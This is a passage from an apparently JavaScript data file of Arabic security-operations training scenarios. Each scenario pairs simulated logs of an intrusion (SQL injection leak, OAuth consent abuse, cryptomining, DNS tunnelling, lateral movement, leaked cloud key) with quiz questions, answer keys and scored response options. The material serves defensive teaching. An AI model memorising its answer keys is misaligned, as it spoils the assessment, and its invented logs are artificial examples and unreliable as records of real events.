      "✗ هذا لا ينفي الاختراق. اختراقات سلسلة التوريد غالبًا تحدث تحديدًا عبر حسابات ناشرين موثّقين تم اختراقها.",
    decisionQuestion: "ما هو الإجراء المناسب الآن؟",
    decisions: [
      {
        id: "rollback-rotate-report",
        label:
          "التراجع فورًا للإصدار الآمن السابق في كل البيئات، تدوير أي أسرار كانت متاحة أثناء نافذة الاختراق، وإبلاغ فريق الحزمة/السجل الرسمي",
        outcome:
          "قرار صحيح. التراجع يوقف تنفيذ الكود الخبيث فورًا، وتدوير الأسرار يمنع استغلال ما تعرّض له، والإبلاغ يحمي مستخدمين آخرين للحزمة نفسها.",
        points: 40,
      },
      {
        id: "update-hope-fixed",
        label: "تحديث الحزمة للإصدار التالي على أمل أن المشكلة عولجت",
        outcome:
          "قرار خطر. الاعتماد على إصدار مستقبلي غير مؤكد يترك بيئة الإنتاج الحالية مكشوفة، والأسرار المسرّبة تبقى صالحة للاستخدام.",
        points: 0,
      },
      {
        id: "disable-ci-only",
        label: "إيقاف خط أنابيب CI مؤقتًا دون معالجة البيئة الإنتاجية القائمة",
        outcome:
          "إجراء جزئي. إيقاف CI يمنع بناءات جديدة مصابة، لكن أي نظام إنتاجي بُني بالفعل بهذه الحزمة يبقى معرّضًا دون معالجة.",
        points: 15,
      },
      {
        id: "trust-reputation",
        label: "تجاهل التنبيه لأن الحزمة تحظى بآلاف التحميلات وسمعة جيدة",
        outcome:
          "قرار خاطئ. السمعة الجيدة والانتشار الواسع هما بالضبط ما يجعل حزمة مخترقة أداة فعّالة لهجمات سلسلة التوريد.",
        points: 5,
      },
    ],
  },

  {
    id: "INC-1101",
    incidentTitle: "حقن SQL وتسريب بيانات العملاء",
    severity: "HIGH",
    meta: "المستوى: متوسط · App: catalog-api · Time: 11:26 UTC",
    brief:
      "رصد الفريق طلبًا غير معتاد إلى واجهة البحث في كتالوج المنتجات. هذه الواجهة مخصّصة لعرض المنتجات فقط ولا تتيح تصدير العملاء. اربط سجلات التطبيق بقاعدة البيانات لتحديد هل توقّف الأمر عند محاولة حقن SQL أم نتج عنه تسريب فعلي.",
    logCommand: "siem --correlate request_id=req-7284",
    logLines: [
      "11:25:50  api    request          path=/health  status=200  duration_ms=4",
      "11:26:02  api    request          id=req-7284  src=198.51.100.42  path=/catalog/search  parameter=q",
      "11:26:02  app    query_trace      id=req-7284  prepared=false  untrusted_input_in_sql=true  expected_table=products",
      "11:26:03  db     query_audit      id=req-7284  principal=catalog_reader  table=customers  columns=email,phone  rows_returned=18400",
      "11:26:03  app    response_audit   id=req-7284  result_type=customer_records  records=18400",
      "11:26:04  api    response         id=req-7284  status=200  bytes_out=1248000  dst=198.51.100.42",
      "11:26:05  change change_lookup    service=catalog-api  approved_customer_export=false",
    ],
    evidenceQuestion: "أي ترابط بين السجلات يثبت وصول الطلب إلى بيانات خارج وظيفة البحث؟",
    evidenceOptions: [
      {
        id: "large-response-only",
        label: "كبر حجم الاستجابة وحده مقارنة بطلب فحص الصحة",
        correct: false,
      },
      {
        id: "correlated-customer-export",
        label:
          "الطلب نفسه أدخل بيانات غير موثوقة في SQL، وقرأ جدول العملاء، وأعاد 18400 سجل عميل إلى المصدر الخارجي",
        correct: true,
      },
      {
        id: "successful-health-check",
        label: "نجاح طلب /health قبل طلب البحث بثوانٍ",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. معرّف req-7284 يربط إدراج المدخل في الاستعلام بقراءة جدول غير مطلوب وإرجاع بياناته فعليًا. حجم الاستجابة وحده لا يثبت التسريب، لكن هذا التسلسل يثبته في السجلات المعروضة.",
    evidenceFeedbackIncorrect:
      "✗ ليس الدليل الحاسم. تتبّع req-7284 من إنشاء استعلام SQL إلى الجدول المقروء ونوع السجلات التي أُرسلت في الاستجابة.",
    decisionQuestion: "ما الاستجابة الأنسب لاحتواء التسريب ومعالجة سببه؟",
    decisions: [
      {
        id: "block-source-only",
        label: "حظر عنوان المصدر فقط مع إبقاء واجهة البحث والاستعلامات كما هي",
        outcome:
          "إجراء جزئي. يحد الحظر من هذا المصدر، لكن يمكن استغلال الواجهة من عنوان آخر. يلزم معالجة بناء الاستعلام وصلاحيات حساب قاعدة البيانات.",
        points: 20,
      },
      {
        id: "contain-fix-scope",
        label:
          "تقييد الواجهة المتأثرة، وحفظ السجلات وتحديد البيانات المتسربة، ثم استخدام استعلامات ذات معاملات (Parameterized Queries) وتقليص صلاحيات قاعدة البيانات قبل إعادتها",
        outcome:
          "قرار صحيح. تقييد الواجهة يوقف مسار التسريب، وحفظ السجلات يسمح بتحديد النطاق. الاستعلامات ذات المعاملات تفصل المدخلات عن بنية SQL، وأقل الصلاحيات يمنع حساب الكتالوج من قراءة بيانات العملاء.",
        points: 40,
      },
      {
        id: "hide-database-errors",
        label: "إخفاء رسائل أخطاء قاعدة البيانات في الاستجابة فقط",
        outcome:
          "معالجة محدودة. إخفاء التفاصيل يقلل كشف المعلومات في الأخطاء، لكنه لا يمنع تنفيذ الاستعلام الذي أعاد بيانات العملاء بنجاح.",
        points: 10,
      },
      {
        id: "trust-success-code",
        label: "إغلاق التنبيه لأن الاستجابة تحمل الرمز 200 ولا توجد أخطاء",
        outcome:
          "قرار خاطئ. الرمز 200 يصف نجاح معالجة الطلب، ولا يثبت أن القراءة مصرّح بها. هنا ارتبط النجاح بإرجاع سجلات العملاء عبر واجهة منتجات.",
        points: 0,
      },
    ],
  },
  {
    id: "INC-1102",
    incidentTitle: "إساءة استخدام موافقة تطبيق OAuth",
    severity: "HIGH",
    meta: "المستوى: متوسط · User: n.hassan · Time: 08:34 UTC",
    brief:
      "أبلغت موظفة عن تطبيق يدّعي تنظيم الفواتير وطلب موافقتها على الوصول إلى بريدها. تسجيل دخولها محمي بالمصادقة المتعددة، لكن فريق الأمن لم يعتمد هذا التطبيق. افحص سجلات الموافقة والوصول لتحديد كيف قرأ التطبيق الرسائل دون تسجيل دخول جديد من الموظفة.",
    logCommand: "identity --audit user=n.hassan client=app-342",
    logLines: [
      "08:34:01  identity sign_in         user=n.hassan  device=CORP-LT-22  mfa=success",
      "08:34:18  oauth    consent_granted user=n.hassan  client_id=app-342  name=Invoice-Helper  scopes=Mail.Read,offline_access",
      "08:34:19  catalog  app_review      client_id=app-342  publisher_verified=false  approved=false",
      "08:35:02  oauth    token_issued    client_id=app-342  grant=refresh_token  src=203.0.113.28",
      "08:35:05  mail-api messages_read   user=n.hassan  client_id=app-342  status=200  count=1240",
      "08:35:07  mail-api attachments_read user=n.hassan  client_id=app-342  status=200  count=36",
      "08:35:10  identity sign_in_lookup  user=n.hassan  interactive_since_consent=0",
    ],
    evidenceQuestion: "ما الذي يفسّر الوصول غير المعتمد إلى البريد رغم نجاح MFA؟",
    evidenceOptions: [
      {
        id: "consent-then-mail-read",
        label:
          "منح التطبيق غير المعتمد Mail.Read وoffline_access ثم استخدام رمزه لقراءة الرسائل والمرفقات بنجاح",
        correct: true,
      },
      {
        id: "mfa-means-app-approved",
        label: "نجاح MFA يعني أن كل تطبيق توافق عليه الموظفة معتمد تلقائيًا من فريق الأمن",
        correct: false,
      },
      {
        id: "no-new-sign-in",
        label: "غياب تسجيل دخول تفاعلي جديد يعني أن الوصول إلى البريد لم يحدث",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. سجلات الموافقة وإصدار الرمز وقراءة البريد ترتبط بالتطبيق app-342. نجاح MFA يتحقق من تسجيل دخول المستخدم، ولا يجعل موافقة التطبيق آمنة؛ وoffline_access يسمح باستمرار الوصول عبر رموز التحديث وفق سياسة المزود.",
    evidenceFeedbackIncorrect:
      "✗ افصل بين توثيق المستخدم وصلاحيات التطبيق. راجع الصلاحيات التي مُنحت لـapp-342 ثم عمليات قراءة البريد المسجّلة باسم التطبيق نفسه.",
    decisionQuestion: "كيف توقف وصول التطبيق وتحدّد ما وصل إليه؟",
    decisions: [
      {
        id: "password-only",
        label: "تغيير كلمة مرور الموظفة فقط مع إبقاء تفويض التطبيق",
        outcome:
          "معالجة محدودة. تغيير كلمة المرور قد يساعد في تأمين الحساب، لكنه لا يلغي بالضرورة موافقة OAuth أو جميع رموز التطبيق. يجب معالجة التفويض والوصول القائم مباشرة.",
        points: 10,
      },
      {
        id: "trust-mfa",
        label: "السماح للتطبيق بالاستمرار لأن الموظفة أتمّت MFA بنفسها",
        outcome:
          "قرار خاطئ. التطبيق يستغل صلاحيات مُنحت له بالفعل، ولا يحتاج تجاوز MFA في كل طلب قراءة. استمرار التفويض يتيح استمرار الوصول إلى البريد.",
        points: 0,
      },
      {
        id: "revoke-app-and-scope",
        label:
          "حظر التطبيق وإبطال تفويضه ورموزه عبر مزود الهوية، وحفظ سجلات الوصول ومراجعة الرسائل والحسابات المتأثرة وضبط سياسة الموافقات",
        outcome:
          "قرار صحيح. حظر التطبيق وإبطال التفويض ورموزه يستهدفان مسار الوصول نفسه. راقب توقف الطلبات وتحقق من سياسة إبطال الرموز لدى المزود، ثم حدّد البيانات المتأثرة وراجع موافقات بقية المستخدمين.",
        points: 40,
      },
      {
        id: "user-sessions-only",
        label: "إبطال جلسات المستخدم وتصعيد البلاغ دون إزالة موافقة التطبيق",
        outcome:
          "إجراء جزئي. إنهاء الجلسات والتصعيد مفيدان، لكن يجب التحقق من إبطال رموز التطبيق أيضًا وإزالة تفويضه؛ بقاء الموافقة قد يتيح استئناف الوصول.",
        points: 20,
      },
    ],
  },
  {
    id: "INC-1103",
    incidentTitle: "تعدين خفي داخل حاوية إنتاج",
    severity: "MEDIUM",
    meta: "المستوى: متوسط · Pod: catalog-api-7f9d · Time: 16:12 UTC",
    brief:
      "ارتفع استهلاك المعالج في حاوية واجهة الكتالوج حتى تدهورت الاستجابة. لا يشغّل هذا التطبيق مهام حسابية مجدولة. قارن نشاط العمليات والاتصالات بعبء العمل المتوقع لتحديد هل الارتفاع ناتج عن ضغط مشروع أم برنامج تعدين غير مصرّح به.",
    logCommand: "runtime --timeline pod=catalog-api-7f9d",
    logLines: [
      "16:11:40  metrics pod_cpu          pod=catalog-api-7f9d  usage=98%  baseline=12%",
      "16:11:42  api     request_rate     pod=catalog-api-7f9d  requests_per_min=84  baseline=80",
      "16:12:01  runtime process_start    pod=catalog-api-7f9d  pid=413  parent=node  path=/tmp/.cache/worker-miner",
      "16:12:03  network connection       pod=catalog-api-7f9d  pid=413  dst=198.51.100.61:3333  domain=pool.compute.example",
      "16:12:04  network protocol         pod=catalog-api-7f9d  pid=413  detected=stratum  mining_job_received=true",
      "16:12:05  runtime process_cpu      pod=catalog-api-7f9d  pid=413  usage=94%",
      "16:12:07  change  job_lookup       workload=catalog-api  approved_compute_job=false",
    ],
    evidenceQuestion: "ما الدليل الأقوى على أن الاستهلاك سببه تعدين غير مصرّح به؟",
    evidenceOptions: [
      {
        id: "high-cpu-only",
        label: "ارتفاع استهلاك المعالج وحده إلى 98%",
        correct: false,
      },
      {
        id: "slight-traffic-increase",
        label: "زيادة الطلبات من 80 إلى 84 طلبًا في الدقيقة",
        correct: false,
      },
      {
        id: "miner-process-and-protocol",
        label:
          "عملية غير معتمدة تستهلك المعالج وتتلقى مهام تعدين ببروتوكول Stratum من عنوان خارجي في السجلات نفسها",
        correct: true,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. ربط PID 413 بالعملية غير المعتمدة واستهلاك المعالج واستلام مهمة تعدين أقوى من الاعتماد على الحمل وحده. حركة الويب بقيت قريبة من المعتاد، فلا تفسّر هذا النشاط.",
    evidenceFeedbackIncorrect:
      "✗ ارتفاع الحمل قد يحدث لأسباب مشروعة. اربط معرّف العملية التي تستهلك المعالج بالاتصال الخارجي والبروتوكول وموافقة مهام الحساب.",
    decisionQuestion: "كيف تحتوي الحاوية وتعيد الخدمة دون فقدان سبب الحادثة؟",
    decisions: [
      {
        id: "isolate-preserve-redeploy",
        label:
          "عزل عبء العمل وحفظ أدلة التشغيل، والتحقق من نقطة الدخول والأسرار المتاحة، ثم معالجة السبب وإعادة نشر صورة موثوقة",
        outcome:
          "قرار صحيح. العزل يحد من الاتصال الخارجي، وحفظ السجلات وحالة التشغيل يدعم تحديد نقطة الدخول. افحص بقية النسخ ودوّر الأسرار التي ثبت أو يُرجّح تعرّضها، ثم أعد الخدمة من صورة موثوقة بعد معالجة السبب.",
        points: 40,
      },
      {
        id: "block-pool-only",
        label: "حظر عنوان مجمّع التعدين فقط وترك الحاوية تعمل",
        outcome:
          "إجراء جزئي. قد يوقف هذا الاتصال مؤقتًا، لكن العملية غير المصرّح بها ونقطة دخولها ما زالتا موجودتين، وقد تتصل بوجهة أخرى.",
        points: 20,
      },
      {
        id: "restart-only",
        label: "إعادة تشغيل الحاوية فقط دون حفظ الأدلة أو التحقيق في نقطة الدخول",
        outcome:
          "معالجة مؤقتة. قد تختفي العملية من الذاكرة، لكن الأدلة المتطايرة تُفقد وقد يتكرر الاختراق إذا بقيت الصورة أو الثغرة أو بيانات الوصول المتأثرة دون معالجة.",
        points: 10,
      },
      {
        id: "add-resources",
        label: "رفع حصة المعالج للحاوية حتى يعود زمن الاستجابة إلى طبيعته",
        outcome:
          "قرار خاطئ. زيادة الموارد لا تزيل برنامج التعدين أو نقطة دخوله، وقد تزيد الموارد التي يستغلها المهاجم وتخفي أثر الحادثة على الخدمة.",
        points: 0,
      },
    ],
  },

  {
    id: "INC-1104",
    incidentTitle: "تسريب بيانات عبر نفق DNS",
    severity: "HIGH",
    meta: "المستوى: متقدم · Host: FIN-LNX-07 · Time: 11:24 UTC",
    brief:
      "ارتفع عدد استعلامات DNS من جهاز في قسم المالية، لكن الارتفاع وحده قد يكون نشاطًا مشروعًا. اربط قراءة الملفات بالعملية المرسلة وبمحتوى الاستعلامات لتحديد ما إذا خرجت بيانات فعلية، ثم اختر استجابة تحافظ على الأدلة.",
    logCommand: "soc --correlate endpoint,dns,dlp host=FIN-LNX-07",
    logLines: [
      "11:23:50  dlp  file_tag  path=/srv/reports/q4-forecast.csv  marker=CT-FIN-TRAINING-42  classification=internal",
      "11:24:01  edr  process_start  host=FIN-LNX-07  pid=4881  name=net-health  signer=unknown",
      "11:24:03  edr  file_read  pid=4881  path=/srv/reports/q4-forecast.csv  bytes=524288",
      "11:24:05  dns  query  host=FIN-LNX-07  pid=4881  type=TXT  name=0001.43542d46494e2d545241494e494e472d3432.sync-check.example",
      "11:24:25  dns  aggregate  host=FIN-LNX-07  pid=4881  domain=sync-check.example  queries=240  labels=hex_chunks  sequence=0001..0240",
      "11:24:26  dns-sensor  reassembly  domain=sync-check.example  decoded_marker=CT-FIN-TRAINING-42  matched_file=/srv/reports/q4-forecast.csv",
      "11:24:27  resolver  forward  domain=sync-check.example  upstream=203.0.113.53  result=NOERROR",
      "11:24:30  inventory  domain_check  domain=sync-check.example  approved_service=false  owner=external",
    ],
    evidenceQuestion: "ما الدليل الأقوى على أن البيانات سُرّبت فعلًا عبر DNS؟",
    evidenceOptions: [
      {
        id: "matched-file-dns-content",
        label:
          "العملية نفسها قرأت ملف المالية، ثم ظهرت العلامة الموجودة داخل الملف في المحتوى المُعاد تجميعه من استعلامات النطاق الخارجي",
        correct: true,
      },
      {
        id: "many-txt-queries",
        label: "وجود عدد كبير من استعلامات TXT خلال فترة قصيرة فقط",
        correct: false,
      },
      {
        id: "successful-resolution",
        label: "نجاح محلّل DNS في حل النطاق وإرجاع NOERROR",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. تطابق العلامة داخل الملف مع المحتوى المُرسَل، وربطهما بالعملية نفسها، يثبت انتقال جزء من محتوى الملف إلى النطاق الخارجي. كثرة الاستعلامات وحدها لا تثبت التسريب.",
    evidenceFeedbackIncorrect:
      "✗ هذا لا يثبت خروج بيانات من الملف. اربط قراءة الملف بالعملية، ثم قارن علامته بالمحتوى الذي أعاد مستشعر DNS تجميعه.",
    decisionQuestion: "كيف توقف التسريب مع الحفاظ على القدرة على التحقيق؟",
    decisions: [
      {
        id: "isolate-block-preserve",
        label:
          "عزل الجهاز عبر EDR وحظر النطاق في محلّل DNS المعتمد، مع جمع الأدلة المتطايرة والسجلات وتحديد الملفات والأجهزة المتأثرة",
        outcome:
          "قرار صحيح. العزل يوقف اتصالات العملية، والحظر يقيّد القناة المعروفة على الأجهزة الأخرى. حفظ الذاكرة والسجلات وربطها بالملفات يتيح تقدير نطاق التسريب والتحقيق في مصدر العملية قبل الاستعادة.",
        points: 40,
      },
      {
        id: "block-domain-only",
        label: "حظر sync-check.example فقط دون عزل الجهاز أو التحقيق في العملية",
        outcome:
          "إجراء جزئي. أغلقت القناة المعروفة، لكن العملية ما زالت قادرة على قراءة الملفات وقد تغيّر نطاقها أو وسيلة الاتصال. يلزم احتواء الجهاز وحفظ الأدلة وتحديد نطاق الضرر.",
        points: 20,
      },
      {
        id: "stop-process-only",
        label: "إنهاء عملية net-health فقط ثم إعادة الجهاز إلى العمل المعتاد",
        outcome:
          "إجراء محدود. قد يوقف النقل مؤقتًا، لكنه لا يعالج طريقة تثبيت العملية أو وسائل بقائها، وقد يفقد أدلة من الذاكرة. لا تُعد الجهاز آمنًا قبل التحقيق والمعالجة.",
        points: 10,
      },
      {
        id: "trust-allowed-dns",
        label: "تجاهل النشاط لأن استعلامات DNS مرّت عبر المحلّل المعتمد",
        outcome:
          "قرار خاطئ. المحلّل المعتمد قد يمرّر استعلامات تحمل بيانات إذا لم يمنعها. تطابق محتوى الملف مع الاستعلامات دليل يستدعي الاحتواء حتى لو كان المسار الشبكي مسموحًا.",
        points: 0,
      },
    ],
  },
  {
    id: "INC-1105",
    incidentTitle: "حركة جانبية باستخدام حساب خدمة مخترق",
    severity: "HIGH",
    meta: "المستوى: متقدم · Hosts: HR-WS-22 → APP-02 · Time: 16:08 UTC",
    brief:
      "ظهر حساب خدمة النسخ الاحتياطي على خادم تطبيقات من جهاز موارد بشرية، وتزامن ذلك مع تثبيت خدمة جديدة. ميّز بين إدارة عن بُعد معتمدة وحركة جانبية، مستعينًا بمصدر بيانات الاعتماد وسجلات الجهازين.",
    logCommand: "soc --timeline host=HR-WS-22,APP-02 account=svc_backup",
    logLines: [
      "16:07:40  cmdb  account_policy  user=svc_backup  allowed_source=MGMT-01  destination=APP-02  interactive_use=false",
      "16:07:51  edr  credential_access  host=HR-WS-22  process=diag-helper.exe  target=lsass.exe  action=memory_read  verdict=malicious",
      "16:08:02  security  event=4624  host=APP-02  user=svc_backup  logon_type=3  auth=NTLM  source=HR-WS-22  source_ip=192.0.2.22",
      "16:08:05  file-audit  host=APP-02  user=svc_backup  share=C$  file=ProgramData\\stage-agent.exe  source=HR-WS-22",
      "16:08:07  security  event=4697  host=APP-02  service=StageAgent  installed_by=svc_backup  binary=C:\\ProgramData\\stage-agent.exe",
      "16:08:09  edr  process_start  host=APP-02  parent=services.exe  name=stage-agent.exe  signer=unknown",
      "16:08:12  network  connection  host=APP-02  process=stage-agent.exe  destination=198.51.100.45:443",
      "16:08:20  change-control  lookup  account=svc_backup  service=StageAgent  approved_ticket=none  maintenance_window=false",
    ],
    evidenceQuestion: "أي تسلسل يدعم وجود حركة جانبية نشطة بأقوى صورة؟",
    evidenceOptions: [
      {
        id: "credentials-to-remote-service",
        label:
          "قراءة ضارة لذاكرة بيانات الاعتماد على HR-WS-22، تلاها دخول بحساب الخدمة من الجهاز نفسه ونسخ ملف وتثبيت خدمة وتشغيلها على APP-02 دون تغيير معتمد",
        correct: true,
      },
      {
        id: "network-logon-alone",
        label: "ظهور حدث دخول شبكي 4624 على الخادم، بصرف النظر عن مصدره وما تلاه",
        correct: false,
      },
      {
        id: "service-account-name",
        label: "بدء اسم الحساب بالبادئة svc التي تُستخدم عادةً لحسابات الخدمات",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. ترابط نشاط سرقة بيانات الاعتماد مع مصدر الدخول المخالف للسياسة ثم التنفيذ البعيد غير المعتمد يجعل تفسير الحركة الجانبية أقوى بكثير من حدث دخول منفرد. يلزم توسيع التحقيق لمعرفة كل الحسابات والأجهزة المتأثرة.",
    evidenceFeedbackIncorrect:
      "✗ قد تظهر هذه المعلومة أثناء إدارة مشروعة أيضًا. تتبّع ما حدث على جهاز المصدر قبل الدخول، ثم ما نُسخ وثُبّت وشُغّل على الخادم الهدف.",
    decisionQuestion: "ما الاستجابة الأنسب لقطع الحركة الجانبية واحتواء بيانات الاعتماد؟",
    decisions: [
      {
        id: "contain-hosts-revoke-access",
        label:
          "احتواء الجهازين بالتنسيق مع التشغيل، وتعطيل وصول الحساب المخترق وإنهاء جلساته، مع حفظ الأدلة وتدوير بياناته والتحقق من بقية الأجهزة والخدمات التابعة",
        outcome:
          "قرار صحيح. احتواء المصدر والهدف يقطع مسار التنفيذ، وتعطيل الوصول وإنهاء الجلسات يعالجان الاستخدام القائم. حفظ الأدلة وحصر الأنظمة التي تعتمد على الحساب يسمحان بتدوير بياناته واستعادة الخدمة بأمان بعد إزالة وسائل البقاء.",
        points: 40,
      },
      {
        id: "isolate-target-only",
        label: "عزل APP-02 فقط مع إبقاء حساب الخدمة وجهاز المصدر نشطين",
        outcome:
          "إجراء جزئي. حميت هدفًا واحدًا، لكن جهاز المصدر وبيانات الاعتماد قد يُستخدمان للوصول إلى أهداف أخرى. يشمل الاحتواء الفعّال الحساب والجلسات والأجهزة المرتبطة.",
        points: 20,
      },
      {
        id: "rotate-password-only",
        label: "تغيير كلمة مرور حساب الخدمة فقط دون إنهاء الجلسات أو فحص الجهازين",
        outcome:
          "إجراء محدود. تغيير كلمة المرور لا يضمن إنهاء كل جلسة قائمة أو إزالة الخدمة التي ثُبّتت بالفعل. ما زالت تحتاج إلى احتواء الأجهزة ومعالجة الوصول النشط وحفظ الأدلة.",
        points: 10,
      },
      {
        id: "accept-service-account",
        label: "اعتبار النشاط طبيعيًا لأن حساب النسخ الاحتياطي يملك وصولًا إداريًا للخادم",
        outcome:
          "قرار خاطئ. امتلاك الصلاحية لا يجعل استخدامها مشروعًا. المصدر غير المسموح ونشاط قراءة بيانات الاعتماد والخدمة غير المعتمدة تستدعي الاستجابة للحادثة.",
        points: 0,
      },
    ],
  },
  {
    id: "INC-1106",
    incidentTitle: "استغلال مفتاح وصول سحابي مسرّب",
    severity: "HIGH",
    meta: "المستوى: متقدم · Identity: reports-reader · Time: 06:42 UTC",
    brief:
      "أبلغ فاحص الأسرار عن بيانات اعتماد مفتاح وصول في ملف إعدادات نُشر بطريق الخطأ. الملف أُزيل، لكن ذلك لا يكشف هل استُخدم المفتاح بالفعل. اربط سجل الفحص بسجلات التدقيق والوصول إلى البيانات، وحدّد كيفية إيقاف المفتاح وأي جلسات صدرت بواسطته.",
    logCommand: "cloud-audit --correlate secret-scan,identity,data-access key=TRAINING-KEY-07",
    logLines: [
      "06:40:10  secret-scan  public_artifact  file=reports-config.txt  credential_id=TRAINING-KEY-07  secret_value=[REDACTED]  exposure=confirmed",
      "06:41:00  inventory  identity_profile  user=reports-reader  key_id=TRAINING-KEY-07  allowed_source=192.0.2.10  expected_role=ReportsReadOnly",
      "06:42:03  cloud-audit  GetCallerIdentity  key_id=TRAINING-KEY-07  source_ip=203.0.113.77  result=success",
      "06:42:07  cloud-audit  AssumeRole  source_key=TRAINING-KEY-07  role=ReportsReadOnly  session=report-export-884  result=success  expires=07:42:07Z",
      "06:42:15  data-audit  ListObjects  principal_session=report-export-884  bucket=finance-reports  source_ip=203.0.113.77  result=success",
      "06:42:21  data-audit  GetObject  principal_session=report-export-884  object=finance-reports/customer-balances.csv  bytes_sent=3145728  result=success",
      "06:42:25  cloud-audit  DeleteObject  principal_session=report-export-884  object=finance-reports/customer-balances.csv  result=AccessDenied",
      "06:42:30  change-control  export_review  session=report-export-884  approved_job=none  approved_source=false",
    ],
    evidenceQuestion: "ما الدليل الأقوى على استخدام المفتاح المسرّب للوصول الفعلي إلى البيانات؟",
    evidenceOptions: [
      {
        id: "key-to-session-to-download",
        label:
          "المفتاح المكشوف أنشأ جلسة من مصدر غير معتمد، ثم نجحت تلك الجلسة في تنزيل ملف مالي مع تسجيل حجم البيانات المُرسَلة",
        correct: true,
      },
      {
        id: "exposure-without-usage",
        label: "وجود معرّف المفتاح في تقرير فاحص الأسرار، دون الرجوع إلى سجلات الاستخدام",
        correct: false,
      },
      {
        id: "delete-denied-means-safe",
        label: "رفض محاولة حذف الملف يعني أن الوصول إلى بياناته قد مُنع بالكامل",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. سلسلة المفتاح ← الجلسة ← تنزيل الملف تربط التعرض باستخدام فعلي من مصدر غير معتمد. رفض الحذف لا يلغي عملية القراءة الناجحة التي سبقتها.",
    evidenceFeedbackIncorrect:
      "✗ التعرض وحده يثبت الخطر، لا الاستخدام الفعلي. ابحث عن جلسة صدرت بالمفتاح ثم عملية قراءة ناجحة؛ صلاحية القراءة مستقلة عن صلاحية الحذف.",
    decisionQuestion: "كيف تحتوي المفتاح المسرّب والجلسة التي أُنشئت به؟",
    decisions: [
      {
        id: "disable-key-revoke-sessions-scope",
        label:
          "تعطيل المفتاح وإبطال الجلسات المتأثرة أو منع وصولها بسياسة مناسبة، مع حفظ سجلات التدقيق وحصر البيانات المقروءة واستبدال بيانات الوصول للخدمات الشرعية",
        outcome:
          "قرار صحيح. تعطيل المفتاح يمنع استخدامه لإنشاء وصول جديد، لكن بيانات الاعتماد المؤقتة قد تبقى صالحة؛ لذلك تُعالج الجلسات أيضًا. حفظ السجلات وحصر القراءات يحددان الضرر، واستبدال بيانات الوصول يتيح استعادة العمل مع معالجة مصدر التسريب.",
        points: 40,
      },
      {
        id: "disable-parent-key-only",
        label: "تعطيل المفتاح طويل الأجل فقط وافتراض أن جلسة report-export-884 انتهت تلقائيًا",
        outcome:
          "إجراء جزئي. أوقفت الاستخدام الجديد للمفتاح، لكن تعطيله لا يضمن إلغاء بيانات اعتماد مؤقتة صدرت به سابقًا. يلزم إبطال الجلسات المتأثرة أو منع وصولها والتحقق من توقف النشاط.",
        points: 20,
      },
      {
        id: "remove-public-file-only",
        label: "حذف ملف الإعدادات المنشور فقط، ثم الاكتفاء بمراقبة المفتاح نفسه",
        outcome:
          "إجراء محدود. إزالة الملف تقلل التعرض اللاحق، لكنها لا تسحب نسخة يحتفظ بها طرف آخر ولا تعطل المفتاح أو الجلسة النشطة. أثبتت السجلات وصولًا يستدعي الاحتواء الآن.",
        points: 10,
      },
      {
        id: "read-only-is-harmless",
        label: "تجاهل الحادثة لأن دور ReportsReadOnly لا يستطيع حذف الملفات",
        outcome:
          "قرار خاطئ. الوصول للقراءة يكفي لتسريب البيانات. تنزيل الملف نجح بالفعل، حتى مع رفض الحذف؛ يجب احتواء الهوية والتحقيق في نطاق القراءة.",
        points: 0,
      },
    ],
  },
];
